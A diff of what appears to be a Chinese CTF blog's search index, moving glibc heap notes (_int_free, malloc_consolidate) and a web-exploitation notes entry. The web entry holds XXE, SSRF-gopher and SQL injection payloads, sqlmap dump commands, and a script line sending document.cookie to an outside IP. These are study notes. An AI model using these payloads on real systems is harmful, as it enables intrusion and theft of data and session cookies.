@@ -13526,78 +13526,6 @@ iterator本身便可以使用对应宏定义(例如<code>__VALUE_TYPE</code>)来
       </tags>
   </entry>
   <entry>
-    <title>heap - 10 - _int_free的相关操作</title>
-    <url>/2020/05/heap-10-_int_free_process/</url>
-    <content><![CDATA[<p>_int_free的一系列操作</p>
-<a id="more"></a>
-<blockquote>
-<p>注意！ 以下步骤若未明确标明退出函数，则表示在执行完当前操作后，继续执行剩余操作</p>
-</blockquote>
-<h2 id="1-判断当前chunk的大小是否异常小或者异常大-内存有无对齐">1. 判断当前chunk的大小是否异常小或者异常大,内存有无对齐</h2>
-<ul>
-<li>如果是，则 <strong>报错退出</strong></li>
-</ul>
-<h2 id="2-如果当前chunk大小-小于-fast-chunk的最大值">2. 如果当前chunk大小 小于 fast chunk的最大值</h2>
-<ul>
-<li>判断下一个内存相邻chunk的size是否异常大或异常小，如果是，则 <strong>报错退出</strong></li>
-<li>判断当前fastbin链头的chunk是否为当前chunk(防止 <strong>连续的</strong> double free)。如果是，则 <strong>报错退出</strong></li>
-<li>将当前chunk放入fastbin链头</li>
-<li>如果实际放入的fast bin，其index与当前chunk的预期index不同，则 <strong>报错退出</strong></li>
-<li>如果上面的都没出错的话，则函数执行结束，<strong>函数返回</strong></li>
-</ul>
-<h2 id="3-判断当前chunk是否是调用mmap分配的">3. 判断当前chunk是否是调用mmap分配的</h2>
-<ul>
-<li>如果是，则
-<ul>
-<li>如果当前chunk为top chunk，则意味着double free， <strong>报错退出</strong>。因为top chunk为free chunk，不可再被free</li>
-<li>如果当前chunk的下一个内存相邻chunk(next chunk)，其内存起始地址超过了top chunk的最大内存地址，则 <strong>报错退出</strong></li>
-<li>如果当前chunk是inuse的，则 <strong>报错退出</strong></li>
-<li>如果next chunk的size异常大或者异常小，则 <strong>报错退出</strong></li>
-<li>如果上一个内存相邻chunk是free chunk，则将上一个chunk unlink，并与当前chunk合并</li>
-<li>判断next chunk是否为top chunk
-<ul>
-<li>如果不是
-<ul>
-<li>判断next chunk是否是空闲的（inuse）
-<ul>
-<li>如果是，则与当前待释放chunk合并</li>
-<li>否则，清空其PREV_INUSE标志位</li>
-</ul>
-</li>
-<li>将当前待释放chunk放入unsorted bin里</li>
-</ul>
-</li>
-<li>如果是
-<ul>
-<li>则当前chunk与top chunk合并</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>如果当前chunk的size大于某个临界点（临界点大小默认65535bytes/64KB）
-<ul>
-<li>如果存在fast chunk，则进行malloc_consolidate</li>
-<li>判断当前arena是否为main_arena
-<ul>
-<li>如果是，并且top chunk的大小超过某个临界点，则调用systrim返还多余内存</li>
-<li>否则，调用heap_trim返还内存给操作系统</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>函数执行结束，<strong>函数返回</strong></li>
-</ul>
-</li>
-<li>如果不是，则调用munmap函数释放当前chunk的内存，函数执行结束，<strong>函数返回</strong></li>
-</ul>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Pwn</tag>
-        <tag>Heap</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>heap - 11 - malloc_consolidate 源码及其部分分析</title>
     <url>/2020/05/heap-11-malloc_consolidate/</url>
     <content><![CDATA[<p>fast chunk的内存整合</p>
@@ -13663,6 +13591,78 @@ iterator本身便可以使用对应宏定义(例如<code>__VALUE_TYPE</code>)来
 <p>所有的分析都以注释的形式添加进源代码中，方便阅读</p>
 </blockquote>
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  ------------------------- malloc_consolidate -------------------------</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  malloc_consolidate is a specialized version of free() that tears</span></span><br><span class="line"><span class="comment">  down chunks held in fastbins.  Free itself cannot be used for this</span></span><br><span class="line"><span class="comment">  purpose since, among other things, it might place chunks back onto</span></span><br><span class="line"><span class="comment">  fastbins.  So, instead, we need to use a minor variant of the same</span></span><br><span class="line"><span class="comment">  code.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Also, because this routine needs to be called the first time through</span></span><br><span class="line"><span class="comment">  malloc anyway, it turns out to be the perfect place to trigger</span></span><br><span class="line"><span class="comment">  initialization code.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn't</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 清空arena上关于fastbin的标志位</span></span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">      until malloc is sure that chunks aren't immediately going to be</span></span><br><span class="line"><span class="comment">      reused anyway.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      <span class="comment">// 依次遍历fastbins的各个index的链头</span></span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line">      <span class="comment">// 如果当前遍历到的index，其链上存在fast chunk</span></span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">          check_inuse_chunk(av, p);</span><br><span class="line">          nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">          size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">          nextchunk = chunk_at_offset(p, size);</span><br><span class="line">          nextsize = chunksize(nextchunk);</span><br><span class="line">          <span class="comment">// 如果上一个内存相邻chunk为free chunk，则与当前chunk合并</span></span><br><span class="line">          <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">            prevsize = p-&gt;prev_size;</span><br><span class="line">            size += prevsize;</span><br><span class="line">            p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">            unlink(av, p, bck, fwd);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 如果下一个内存相邻chunk不为top chunk</span></span><br><span class="line">          <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">            nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">            <span class="comment">// 如果下一个内存相邻chunk为free chunk，则与当前chunk合并</span></span><br><span class="line">            <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">              size += nextsize;</span><br><span class="line">              unlink(av, nextchunk, bck, fwd);</span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">              clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将（已经合并了相邻chunk的）当前chunk放入unsorted bin里</span></span><br><span class="line">            first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">            unsorted_bin-&gt;fd = p;</span><br><span class="line">            first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">              p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">              p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            set_head(p, size | PREV_INUSE);</span><br><span class="line">            p-&gt;bk = unsorted_bin;</span><br><span class="line">            p-&gt;fd = first_unsorted;</span><br><span class="line">            set_foot(p, size);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// 如果下一个内存相邻chunk是top chunk</span></span><br><span class="line">          <span class="comment">// 当前fast chunk与top chunk合并</span></span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            size += nextsize;</span><br><span class="line">            set_head(p, size | PREV_INUSE);</span><br><span class="line">            av-&gt;top = p;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="comment">// 一直遍历，直到当前fastbin链上的所有chunk全部放入unsorted bin里</span></span><br><span class="line">        &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 一直遍历，直到所有fastbin链全部遍历完成</span></span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 初始时 fastchunk的最大值为0，此时需要对heap进行初始化</span></span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Pwn</tag>
+        <tag>Heap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>heap - 10 - _int_free的相关操作</title>
+    <url>/2020/05/heap-10-_int_free_process/</url>
+    <content><![CDATA[<p>_int_free的一系列操作</p>
+<a id="more"></a>
+<blockquote>
+<p>注意！ 以下步骤若未明确标明退出函数，则表示在执行完当前操作后，继续执行剩余操作</p>
+</blockquote>
+<h2 id="1-判断当前chunk的大小是否异常小或者异常大-内存有无对齐">1. 判断当前chunk的大小是否异常小或者异常大,内存有无对齐</h2>
+<ul>
+<li>如果是，则 <strong>报错退出</strong></li>
+</ul>
+<h2 id="2-如果当前chunk大小-小于-fast-chunk的最大值">2. 如果当前chunk大小 小于 fast chunk的最大值</h2>
+<ul>
+<li>判断下一个内存相邻chunk的size是否异常大或异常小，如果是，则 <strong>报错退出</strong></li>
+<li>判断当前fastbin链头的chunk是否为当前chunk(防止 <strong>连续的</strong> double free)。如果是，则 <strong>报错退出</strong></li>
+<li>将当前chunk放入fastbin链头</li>
+<li>如果实际放入的fast bin，其index与当前chunk的预期index不同，则 <strong>报错退出</strong></li>
+<li>如果上面的都没出错的话，则函数执行结束，<strong>函数返回</strong></li>
+</ul>
+<h2 id="3-判断当前chunk是否是调用mmap分配的">3. 判断当前chunk是否是调用mmap分配的</h2>
+<ul>
+<li>如果是，则
+<ul>
+<li>如果当前chunk为top chunk，则意味着double free， <strong>报错退出</strong>。因为top chunk为free chunk，不可再被free</li>
+<li>如果当前chunk的下一个内存相邻chunk(next chunk)，其内存起始地址超过了top chunk的最大内存地址，则 <strong>报错退出</strong></li>
+<li>如果当前chunk是inuse的，则 <strong>报错退出</strong></li>
+<li>如果next chunk的size异常大或者异常小，则 <strong>报错退出</strong></li>
+<li>如果上一个内存相邻chunk是free chunk，则将上一个chunk unlink，并与当前chunk合并</li>
+<li>判断next chunk是否为top chunk
+<ul>
+<li>如果不是
+<ul>
+<li>判断next chunk是否是空闲的（inuse）
+<ul>
+<li>如果是，则与当前待释放chunk合并</li>
+<li>否则，清空其PREV_INUSE标志位</li>
+</ul>
+</li>
+<li>将当前待释放chunk放入unsorted bin里</li>
+</ul>
+</li>
+<li>如果是
+<ul>
+<li>则当前chunk与top chunk合并</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>如果当前chunk的size大于某个临界点（临界点大小默认65535bytes/64KB）
+<ul>
+<li>如果存在fast chunk，则进行malloc_consolidate</li>
+<li>判断当前arena是否为main_arena
+<ul>
+<li>如果是，并且top chunk的大小超过某个临界点，则调用systrim返还多余内存</li>
+<li>否则，调用heap_trim返还内存给操作系统</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>函数执行结束，<strong>函数返回</strong></li>
+</ul>
+</li>
+<li>如果不是，则调用munmap函数释放当前chunk的内存，函数执行结束，<strong>函数返回</strong></li>
+</ul>
 ]]></content>
       <tags>
         <tag>CTF</tag>
@@ -13796,199 +13796,6 @@ iterator本身便可以使用对应宏定义(例如<code>__VALUE_TYPE</code>)来
         <tag>Pwn</tag>
         <tag>Heap</tag>
         <tag>pwnable.tw</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF Web 的笔记</title>
-    <url>/2020/04/CTF_web/</url>
-    <content><![CDATA[<p>一点点曾经整理的Web笔记，篇幅会相对较小一点。</p>
-<h2 id="1-XXE-攻击-XML">1. XXE 攻击 (XML)</h2>
-<ol>
-<li>
-<p>示例</p>
- <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="symbol">&amp;xxe;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<h2 id="2-SSRF">2. SSRF</h2>
-<h3 id="函数的注意点">函数的注意点</h3>
-<h4 id="1-cURL">1. cURL</h4>
-<h4 id="2-file-get-contents">2. file_get_contents</h4>
-<ul>
-<li>gopher 协议无法URLencode</li>
-<li>关于gopher的302跳转有bug，导致利用失败</li>
-</ul>
-<a id="more"></a>
-<h3 id="一个有趣的域名">一个有趣的域名</h3>
-<p><a href="http://xip.io" target="_blank" rel="noopener">xip.io</a> - 这个域名在bypass WAF时可能会有点作用<br>
-以下是简介</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">What is xip.io?</span><br><span class="line">xip.io is a magic domain name that provides wildcard DNS</span><br><span class="line">for any IP address. Say your LAN IP address is 10.0.0.1.</span><br><span class="line">Using xip.io,</span><br><span class="line"></span><br><span class="line">          10.0.0.1.xip.io   resolves to   10.0.0.1</span><br><span class="line">      www.10.0.0.1.xip.io   resolves to   10.0.0.1</span><br><span class="line">   mysite.10.0.0.1.xip.io   resolves to   10.0.0.1</span><br><span class="line">  foo.bar.10.0.0.1.xip.io   resolves to   10.0.0.1</span><br><span class="line"></span><br><span class="line">...and so on. You can use these domains to access virtual</span><br><span class="line">hosts on your development web server from devices on your</span><br><span class="line">local network, like iPads, iPhones, and other computers.</span><br><span class="line">No configuration required!</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>注意：windows清除本地DNS缓存的命令为<br>
-ipconfig/flusdns<br>
-（别问我为什么要给出来，相信我，你一定会用上的 <strong>XD</strong>)</p>
-</blockquote>
-<h3 id="1-file协议">1. file协议</h3>
-<blockquote>
-<p>file://localhost/etc/passwd 能够读取到 /etc/passwd 的内容，同时这种情况会忽略 host</p>
-</blockquote>
-<h3 id="2-gopher协议">2. gopher协议</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;&#123;host&#125;:&#123;port&#125;&#x2F;_&#123;body&#125;</span><br></pre></td></tr></table></figure>
-<p>使用方法：</p>
-<ol>
-<li>
-<p>首先构造 POST 的 payload</p>
- <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#x3D;h1admin&amp;hacker&#x3D;system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>然后构造整个 HTTP 请求（ <strong>Content-Length不能少</strong> ）<br>
-注意:</p>
-<ul>
-<li>每个冒号后面都有一个空格</li>
-<li>http头和携带的请求数据之间间隔一个空行</li>
-<li>所有的换行都是 <strong>'\r\n’</strong></li>
-<li>分号一定要用 <code>%3B</code></li>
-<li>Content-Length 是 html报文中 body的长度（URL编码前） ， 不包括报头
-<ul>
-<li>Content-Length一定要设置正确，否则会返回http 400错误</li>
-</ul>
-</li>
-</ul>
- <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;webshe11111111.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: curl&#x2F;7.43.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Content-Length: 34</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">admin&#x3D;h1admin&amp;hacker&#x3D;system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>加上协议的其他部分</p>
- <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST &#x2F;webshe11111111.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: curl&#x2F;7.43.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Content-Length: 34</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">admin&#x3D;h1admin&amp;hacker&#x3D;system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>url 编码 （有些部分需要二次编码，例如<code>%0d %0a %20 分别编码为 %250d %250a %2520</code>）</p>
- <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher%3A%2F%2F127.0.0.1%3A80%2F_POST%2520%2Fwebshe11231231231.php%2520HTTP%2F1.1%250D%250AHost%3A%2520127.0.0.1%250D%250AUser-Agent%3A%2520curl%2F7.43.0%250D%250AAccept%3A%2520*%2F*%250D%250AContent-Length%3A%252034%250D%250AContent-Type%3A%2520application%2Fx-www-form-urlencoded%250D%250A%250D%250Aadmin%3Dh1admin%26hacker%3Dsystem(%22ls%22)%3B</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>访问该地址得到目录下的文件</p>
-</li>
-</ol>
-<h2 id="3-xss攻击">3. xss攻击</h2>
-<ul>
-<li>
-<p>源码</p>
-  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>( $_GET[<span class="string">"code"</span>]))</span><br><span class="line">    $cookie = $_GET[<span class="string">"code"</span>];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    $cookie = <span class="string">"no_cookies"</span>;</span><br><span class="line">$time = date(<span class="string">'Y-m-d g:i:s'</span>);</span><br><span class="line">$fp = fopen(<span class="string">"cookie.txt"</span>,<span class="string">"a"</span>);</span><br><span class="line">fwrite($fp, <span class="string">"Date: "</span>.$time.<span class="string">" Cookie:"</span>.$cookie.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Visited"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  &lt;script&gt;document.location="http://222.186.150.131:37992/index.php?code="+document.cookie;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>有趣的域名</p>
-<ul>
-<li>倘若自己没有独立的服务器， 或不能内网穿透，可以试试这个域名
-<ul>
-<li><a href="http://ceye.io" target="_blank" rel="noopener">ceye.io</a></li>
-</ul>
-</li>
-<li>这个网站会记录下发送到个人子域名的所有http流量，如此便可以得到返回的cookie</li>
-</ul>
-</li>
-</ul>
-<p>在console窗口中输入如下代码刷新页面即可设置新cookies</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">document.cookie="keyName=cookeiValue";</span><br></pre></td></tr></table></figure>
-<h2 id="4-⽂件包含-伪协议-base64-解码">4. ⽂件包含+伪协议 base64 解码</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.com&#x2F;index.php?action&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
-<h2 id="5-SQL">5. SQL</h2>
-<ol>
-<li>
-<p>sql 注入</p>
-<blockquote>
-<p>注意点：<br>
-在地址栏输入<code>#</code>时，应尽量改写成<code>%23</code>，原因是<code>#</code>在地址栏中有特殊的含义<br>
-在地址栏输入空格<code> </code>时，应尽量改写成<code>%20</code>或<code>+</code></p>
-</blockquote>
-<ol>
-<li>
-<p>常用过WAF的套路</p>
-<ol>
-<li>
-<p>空格过滤</p>
-<ul>
-<li>用注释符<code>/**/</code></li>
-</ul>
- <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=1'<span class="comment">/*1*/</span>union<span class="comment">/*1*/</span><span class="keyword">select</span><span class="comment">/*1*/</span><span class="keyword">database</span>();<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-</li>
-<li>
-<p>常用语句</p>
-<ol>
-<li>
-<p>判断当前表的列数</p>
- <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">order by 列数 %23</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>获取当前数据库名</p>
- <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">database</span>() %<span class="number">23</span></span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>获取所有数据库名</p>
- <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">group_concat</span>(SCHEMA_NAME) <span class="keyword">from</span> information_schema.SCHEMATA %<span class="number">23</span></span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>获取指定数据库的表名</p>
- <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'数据库名'</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>获取指定数据表的列名（字段名）</p>
- <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'数据库名'</span> <span class="keyword">and</span> table_name=<span class="string">'表名'</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>获取指定数据表指定字段的全部数据（使用<code>where</code>指定单一数据）</p>
- <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> 字段名 <span class="keyword">from</span> 表名 %<span class="number">23</span></span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>修改指定数据表指定字段的数据（使用<code>where</code>指定单一数据）</p>
- <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">; <span class="keyword">UPDATE</span> 表名 <span class="keyword">set</span> 字段=内容 <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>
-<p><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">Sqli-labs</a></p>
-</li>
-<li>
-<p>sqlmap常用语法</p>
- <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">检查注入点：</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id&#x3D;11</span><br><span class="line"></span><br><span class="line">爆所有数据库信息：</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id&#x3D;11 --dbs</span><br><span class="line"></span><br><span class="line">爆当前数据库信息：</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id&#x3D;11 --current-db</span><br><span class="line"></span><br><span class="line">指定库名列出所有表</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id＝11 -D vhost48330 --tables # &#39;vhost48330&#39; 为指定数据库名称</span><br><span class="line"></span><br><span class="line">指定库名表名列出所有字段</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id＝11 -D vhost48330 -T admin --columns# &#39;admin&#39; 为指定表名称</span><br><span class="line"></span><br><span class="line">指定库名表名字段dump出指定字段</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id＝11 -D vhost48330 -T admin -C ac，id，password --dump# &#39;ac,id,password&#39; 为指定字段名称</span><br><span class="line"></span><br><span class="line">各种过WAF的tamper脚本</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id&#x3D;11 --dbs --tamper&#x3D;&quot;space2plus.py,hex2char.py&quot;</span><br><span class="line"></span><br><span class="line">使用多线程</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id&#x3D;11 --dbs --thread&#x3D;10</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>其他</p>
-<ol>
-<li><strong>information_schema</strong> 数据库表说明:
-<ul>
-<li>SCHEMATA 表：提供了当前 mysql 实例中所有数据库的信息。<code>show databases</code> 的结果取之此表。</li>
-<li>TABLES 表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个 schema，表类型，表引擎，创建时间等信息。<code>show tables from schemaname</code> 的结果取之此表。</li>
-<li>COLUMNS 表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。<code>show columns from schemaname.tablename</code> 的结果取之此表。</li>
-</ul>
-</li>
-</ol>
-</li>
-<li>
-<p>常用 sql 语法</p>
- <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">UNION 操作符用于合并两个或多个 <span class="keyword">SELECT</span> 语句的结果集。</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<h2 id="6-php">6. php</h2>
-<ol>
-<li>
-<p>php 超全局变量</p>
- <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$GLOBALS</span><br><span class="line">$_SERVER</span><br><span class="line">$_REQUEST</span><br><span class="line">$_POST</span><br><span class="line">$_GET</span><br><span class="line">$_FILES</span><br><span class="line">$_ENV</span><br><span class="line">$_COOKIE</span><br><span class="line">$_SESSION</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>md5 碰撞 =&gt; 利用 php 弱类型</p>
-</li>
-</ol>
-<ul>
-<li>0e 纯数字的字符串在判断相等的时候会被认为是科学计数法的数字，⽐较时⾸先会做字符串到数字的转换。</li>
-<li>转换后都成为了 0 的 n 次⽅，相等。</li>
-<li>md5 以 0e 开头的字符例子： <code>QNKCDZO</code> <code>240610708</code></li>
-</ul>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -14313,6 +14120,199 @@ numbwritten 是指 printf 在格式化字符串之前输出的数据，比如 pr
       </tags>
   </entry>
   <entry>
+    <title>CTF Web 的笔记</title>
+    <url>/2020/04/CTF_web/</url>
+    <content><![CDATA[<p>一点点曾经整理的Web笔记，篇幅会相对较小一点。</p>
+<h2 id="1-XXE-攻击-XML">1. XXE 攻击 (XML)</h2>
+<ol>
+<li>
+<p>示例</p>
